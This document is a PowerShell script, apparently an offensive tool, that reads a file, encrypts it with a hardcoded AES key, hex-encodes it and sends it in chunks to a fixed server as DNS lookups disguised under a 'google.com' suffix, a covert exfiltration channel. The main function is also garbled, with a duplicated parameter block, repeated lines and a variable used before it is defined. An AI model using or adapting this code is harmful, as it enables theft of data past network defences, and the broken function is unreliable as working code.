function DNS-exfil
{
    param ([string] $file)
    $server = '192.168.0.17'
    $bytes = [System.IO.File]::ReadAllBytes($file)
    $hash = [System.BitConverter]::ToString($md5.ComputeHash($bytes))
    $hash = $hash -replace '-','';
    $md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
    $bytes = AES $bytes
    $string = [System.BitConverter]::ToString($bytes);
    $string = $string -replace '-','';
    $filename = Split-Path $file -leaf
    param ([string] $file)
    $server = '192.168.0.17'
    $bytes = [System.IO.File]::ReadAllBytes($file)
    $string = [System.BitConverter]::ToString($bytes);
    $string = $string -replace '-','';
    $data = [System.IO.File]::ReadAllBytes($file)

    $string = [System.BitConverter]::ToString($data);
    $md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
    $hash = [System.BitConverter]::ToString($md5.ComputeHash($bytes))
    $hash = $hash -replace '-','';
    $filename = Split-Path $file -leaf
    $len = $string.Length;
    #$split = Get-Random -minimum 1 -maximum 250;
    $split = 50
    $id = 0
    # get the size of the file and split it
    $repeat=[Math]::Ceiling($len/$split);
    $remainder=$len%$split;
    $jobid = [System.Guid]::NewGuid().toString().Substring(0, 7)
    $data = $jobid + '|!|' + $filename + '|!|REGISTER|!|' + $hash 
    $q = Send-DNSRequest $server $data $jobid
    for($i=0; $i-lt($repeat-1); $i++){
        $str = $string.Substring($i * $Split, $Split);
        $data = $jobid + '|!|' + $i + '|!|' + $str
        $q = Send-DNSRequest $server $data $jobid
    };
    if($remainder){
        $str = $string.Substring($len-$remainder);
        $i = $i +1
        $data = $jobid + '|!|' + $i + '|!|' + $str
        $q = Send-DNSRequest $server $data $jobid
    };
    
    $i = $i + 1
    $data = $jobid + '|!|' + $i + '|!|DONE'
    $q = Send-DNSRequest $server $data $jobid
};

function Send-DNSRequest {
    param ([string] $server, [string] $data, [string] $jobid)
    $data = Convert-ToCHexString $data  
    $len = $data.Length;
    $key = 'google.com'
    #$split = Get-Random -minimum 1 -maximum 250;
    $split = 66 - $len.Length - $key.Length;
    # get the size of the file and split it
    $repeat=[Math]::Floor($len/($split));
    $remainder=$len%$split;
    if($remainder){ 
        $repeatr = $repeat + 1
    };
    
    for($i=0; $i-lt$repeat; $i++){
        $str = $data.Substring($i*$Split,$Split);
        $str = $jobid + $str + '.' + $key;
        $q = nslookup -querytype=A $str $server -timeout=0.1;
    };
    if($remainder){
        $str = $data.Substring($len-$remainder);
        $str = $jobid + $str + '.' + $key;
        $q = nslookup -querytype=A $str $server -timeout=0.1;
    };
};

function AES {
    param ([byte[]] $data)

    $key = "THISISACRAZYKEY"
    $sha256 = New-Object System.Security.Cryptography.SHA256Managed

    $AES = New-Object System.Security.Cryptography.AesManaged
    $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $AES.BlockSize = 128
    $AES.KeySize = 256
    $AES.Padding = "PKCS7"
    $AES.Key = [Byte[]] $sha256.ComputeHash([Text.Encoding]::ASCII.GetBytes($key))

    $IV = new-object "System.Byte[]" 16
    $RNGCrypto = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
    $RNGCrypto.GetBytes($IV)
    $AES.IV = $IV

    $Encryptor = $AES.CreateEncryptor()

    return ($IV + $encryptor.TransformFinalBlock($data, 0, $data.Length))
};

function Convert-ToCHexString 
{
    param ([String] $str) 
    $ans = ''
    [System.Text.Encoding]::ASCII.GetBytes($str) | % { $ans += "{0:X2}" -f $_ }
    return $ans;
}